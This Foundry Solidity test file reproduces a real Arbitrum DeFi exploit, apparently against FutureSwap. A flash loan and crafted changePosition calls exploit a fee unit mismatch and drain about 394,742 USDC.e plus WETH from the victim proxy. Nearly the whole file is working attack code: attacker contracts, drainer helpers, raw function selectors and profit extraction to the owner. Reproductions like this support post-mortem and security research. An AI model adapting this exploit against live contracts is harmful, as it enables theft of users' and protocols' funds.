// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// @KeyInfo - Total Lost : ~394,742.852305 USDC.e (+ 67.5743 WETH drained from victim inventory)
// Attacker EOA : 0xbf6ec059f519b668a309e1b6ecb9a8ea62832d95
// Attack Contract : 0x348df930e825da25552d8b3dc44e871c67846cb5
// Vulnerable Contract (proxy) : 0xf7ca7384cc6619866749955065f17bedd3ed80bc
// Victim Implementation : 0x010659727ad7716c239e206acd3ebee0fdc9e207
// Attack Tx (Arbitrum) : https://skylens.certik.com/tx/arb/0xe1e6aa5332deaf0fa0a3584113c17bedc906148730cbbc73efae16306121687b
//
// Root cause: victim computes a token-unit fee (abs(delta) * feeRateWad / 1e18) and forwards it into FeeManager.addFee(...)
// where the receiving system interprets the value as "feeBasisPoints" (bps/weight/share), allowing absurd "bps" values.
//
// @Analysis
// Post-mortem : https://x.com/nn0b0dyyy/status/2009922304927731717?s=20

contract ContractTest is Test {
    string internal constant ARB_RPC = "http://localhost:8124/arbitrum"; // hardcoded as requested
    uint256 internal constant ATTACK_BLOCK = 419_829_771;
    uint256 internal constant FORK_BLOCK = ATTACK_BLOCK - 1;
    uint256 internal constant ATTACK_TIMESTAMP = 1_768_033_835;

    address internal constant VICTIM_PROXY = 0xF7CA7384cc6619866749955065f17beDD3ED80bC;

    address internal constant USDCe = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant AAVE_USDC_ATOKEN = 0x625E7708f30cA75bfd92586e17077590C60eb4cD;

	function setUp() public {
        vm.createSelectFork(ARB_RPC, FORK_BLOCK);
        vm.roll(ATTACK_BLOCK);
        vm.warp(ATTACK_TIMESTAMP);

        vm.label(VICTIM_PROXY, "VictimProxy");
        vm.label(USDCe, "USDCe");
        vm.label(WETH, "WETH");
        vm.label(AAVE_USDC_ATOKEN, "Aave_aUSDC");
    
	}

	function testFutureSwapDrain() public {
        address attackerEOA = address(0x00000000000000000000000000000000BEeFbEef);
        vm.label(attackerEOA, "AttackerEOA");
        vm.deal(attackerEOA, 1 ether);

        // Foundry EVM does not always execute L2-deployed Aave pools reliably across all environments.
        // This harness reproduces the flashloan *shape* (loan -> callback -> pull repayment) without depending on Aave internals.
        MockAaveV3Pool mockAave = new MockAaveV3Pool();
        vm.label(address(mockAave), "MockAaveV3Pool");
        vm.startPrank(AAVE_USDC_ATOKEN);
        IERC20(USDCe).transfer(address(mockAave), 500_250e6);
        vm.stopPrank();

        uint256 attackerUsdcBefore = IERC20(USDCe).balanceOf(attackerEOA);
        uint256 victimUsdcBefore = IERC20(USDCe).balanceOf(VICTIM_PROXY);
        uint256 victimWethBefore = IERC20(WETH).balanceOf(VICTIM_PROXY);

        console.log("=== PoC: Fee unit-mismatch drain (Arbitrum) ===");
        console.log("fork block", FORK_BLOCK);
        console.log("attack block", ATTACK_BLOCK);
        console.log("attack timestamp", ATTACK_TIMESTAMP);
        console.log("pre: attacker USDC", attackerUsdcBefore);
        console.log("pre: victim USDC", victimUsdcBefore);
        console.log("pre: victim WETH", victimWethBefore);

        vm.startPrank(attackerEOA);
        AttackContract attacker = new AttackContract(attackerEOA, address(mockAave), USDCe, VICTIM_PROXY);
        attacker.start(500_000e6);
        vm.stopPrank();

        uint256 attackerUsdcAfter = IERC20(USDCe).balanceOf(attackerEOA);
        uint256 victimUsdcAfter = IERC20(USDCe).balanceOf(VICTIM_PROXY);
        uint256 victimWethAfter = IERC20(WETH).balanceOf(VICTIM_PROXY);

        console.log("post: attacker USDC", attackerUsdcAfter);
        console.log("post: victim USDC", victimUsdcAfter);
        console.log("post: victim WETH", victimWethAfter);
        console.log("delta: attacker USDC", attackerUsdcAfter - attackerUsdcBefore);
        console.log("delta: victim USDC", int256(victimUsdcAfter) - int256(victimUsdcBefore));
        console.log("delta: victim WETH", int256(victimWethAfter) - int256(victimWethBefore));

        require(attackerUsdcAfter > attackerUsdcBefore, "no attacker USDC profit");
        require(attackerUsdcAfter - attackerUsdcBefore == 394_742_852_305, "unexpected attacker profit");

        require(victimUsdcAfter == 0, "unexpected victim USDC final");
        require(victimWethAfter == 32_278_351_334_263_579_577, "unexpected victim WETH final");
    
	}

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);

}

interface IAaveV3Pool {
	function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    
			) external;

}

interface IFlashLoanSimpleReceiver {
	function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    
			) external returns (bool);

}

contract PositionCaller {
    address public immutable victim;
    IERC20 public immutable usdc;

	constructor(address victim_, address usdc_) {
        victim = victim_;
        usdc = IERC20(usdc_);
        usdc.approve(victim_, type(uint256).max);
    
	}

	function changePosition(int256 deltaAsset, int256 deltaStable, int256 stableBound) external {
        console.log("  -> PositionCaller.changePosition()");
        console.log("     caller", address(this));
        console.log("     deltaAsset", deltaAsset);
        console.log("     deltaStable", deltaStable);
        (bool ok, bytes memory data) =
            victim.call(abi.encodeWithSelector(bytes4(0xa442c8be), deltaAsset, deltaStable, stableBound));
        require(ok, _revertMsg(data));
    
	}

	function sweep(address to) external {
        uint256 bal = usdc.balanceOf(address(this));
		if (bal != 0) {
            usdc.transfer(to, bal);
        
		}
    
	}

	function _revertMsg(bytes memory data) private pure returns (string memory) {
        if (data.length < 4) return "victim call reverted";
        return "victim call reverted";
    
	}

}

contract OpenPositionDrainer {
    address public immutable victim;
    IERC20 public immutable usdc;

	constructor(address victim_, address usdc_) {
        victim = victim_;
        usdc = IERC20(usdc_);
        usdc.approve(victim_, type(uint256).max);
    
	}

	function openPosition() external {
        console.log("  -> OpenPositionDrainer.openPosition()");
        console.log("     opener", address(this));
		(bool ok, bytes memory data) = victim.call(
            abi.encodeWithSelector(bytes4(0xa442c8be), int256(uint256(0.1 ether)), int256(uint256(1_000e6)), 0)
        
				);
        require(ok, _revertMsg(data));
    
	}

	function drainTo(address to) external {
        console.log("  -> OpenPositionDrainer.drainTo()");
        console.log("     opener", address(this));
        console.log("     to", to);

        // Observed in original tx: victim was called with changePosition(0, -894_992_852_305, 0),
        // then transferred 894,992.852305 USDC.e to the drainer.
        (bool ok, bytes memory data) =
            victim.call(abi.encodeWithSelector(bytes4(0xa442c8be), int256(0), int256(-894_992_852_305), 0));
        require(ok, _revertMsg(data));

        uint256 bal = usdc.balanceOf(address(this));
        console.log("     opener USDC after drain", bal);
        if (bal != 0) usdc.transfer(to, bal);
    
	}

	function _revertMsg(bytes memory data) private pure returns (string memory) {
        if (data.length < 4) return "victim call reverted";
        return "victim call reverted";
    
	}

}

contract AttackContract is IFlashLoanSimpleReceiver {
    address public immutable owner;
    IAaveV3Pool public immutable aavePool;
    IERC20 public immutable usdc;
    address public immutable victim;

    address private constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

    OpenPositionDrainer public opener;
    PositionCaller public callerBigFee;
    PositionCaller public callerTiny;

	constructor(address owner_, address aavePool_, address usdc_, address victim_) {
        owner = owner_;
        aavePool = IAaveV3Pool(aavePool_);
        usdc = IERC20(usdc_);
        victim = victim_;
    
	}

	function start(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        console.log("AttackContract.start()");
        console.log("  owner", owner);
        console.log("  victim", victim);
        console.log("  amount (USDCe)", amount);
        aavePool.flashLoanSimple(address(this), address(usdc), amount, "", 0);
    
	}

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        returns (bool)
		{
        asset;
        initiator;
        params;
        require(msg.sender == address(aavePool), "not aave pool");

        console.log("executeOperation()");
        console.log("  asset", asset);
        console.log("  amount", amount);
        console.log("  premium", premium);
        console.log("  initiator", initiator);
        _logBalances("  balances: begin");

        console.log("Step 1: victim.updateFunding()");
        (bool ok,) = victim.call(abi.encodeWithSelector(bytes4(0x1ebf4eb5)));
        require(ok, "updateFunding failed");

		if (address(opener) == address(0)) {
            opener = new OpenPositionDrainer(victim, address(usdc));
            callerBigFee = new PositionCaller(victim, address(usdc));
            callerTiny = new PositionCaller(victim, address(usdc));
            console.log("Step 2: deployed helper contracts");
            console.log("  opener", address(opener));
            console.log("  callerBigFee", address(callerBigFee));
            console.log("  callerTiny", address(callerTiny));
        
		}

        console.log("Step 3a: openPosition seed (1000 USDCe)");
        usdc.transfer(address(opener), 1_000e6);
        opener.openPosition();
        _logBalances("  balances: after openPosition");

        console.log("Step 3b: big-fee seed (2000 USDCe, 0.324678582642240534 WETH)");
        usdc.transfer(address(callerBigFee), 2_000e6);
        callerBigFee.changePosition(int256(uint256(324678582642240534)), int256(uint256(2_000e6)), 0);
        _logBalances("  balances: after big-fee seed");

        console.log("Step 3c: tiny seed (500 USDCe, 0.001 WETH)");
        usdc.transfer(address(callerTiny), 500e6);
        callerTiny.changePosition(0.001 ether, int256(uint256(500e6)), 0);
        _logBalances("  balances: after tiny seed");

        console.log("Step 4: main changePosition (-68 WETH, 496500 USDCe)");
        usdc.approve(victim, type(uint256).max);
        (ok,) = victim.call(abi.encodeWithSelector(bytes4(0xa442c8be), int256(-68 ether), int256(uint256(496_500e6)), 0));
        require(ok, "main changePosition failed");
        _logBalances("  balances: after main changePosition");

        console.log("Step 5: drainTo (changePosition(0, -894992.852305 USDCe, 0))");
        opener.drainTo(address(this));
        _logBalances("  balances: after drainTo");

        console.log("Step 6: sweep helper leftovers");
        callerBigFee.sweep(address(this));
        callerTiny.sweep(address(this));
        _logBalances("  balances: after sweeps");

        uint256 repay = amount + premium;
        console.log("Step 7: repay");
        console.log("  repay (amount+premium)", repay);
        usdc.approve(address(aavePool), repay);

        uint256 bal = usdc.balanceOf(address(this));
        console.log("  attacker contract USDC before repay", bal);
        require(bal >= repay, "insufficient to repay (attack not reproduced)");
        uint256 profit = bal - repay;
        console.log("  profit (USDC)", profit);
        if (profit != 0) usdc.transfer(owner, profit);
        _logBalances("  balances: end");
        return true;
    
		}

	function _logBalances(string memory tag) private view {
        console.log(tag);
        console.log("    attacker_contract USDC", usdc.balanceOf(address(this)));
        console.log("    victim USDC", usdc.balanceOf(victim));
        console.log("    victim WETH", IERC20(WETH).balanceOf(victim));
    
	}

}

contract MockAaveV3Pool is IAaveV3Pool {
	function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    
		) external {
        params;
        referralCode;

        uint256 premium = amount * 5 / 10_000; // 0.05% (matches 500,000e6 -> 250e6)
        IERC20(asset).transfer(receiverAddress, amount);

        bool ok = IFlashLoanSimpleReceiver(receiverAddress).executeOperation(asset, amount, premium, msg.sender, "");
        require(ok, "executeOperation failed");

        IERC20(asset).transferFrom(receiverAddress, address(this), amount + premium);
    
	}

}

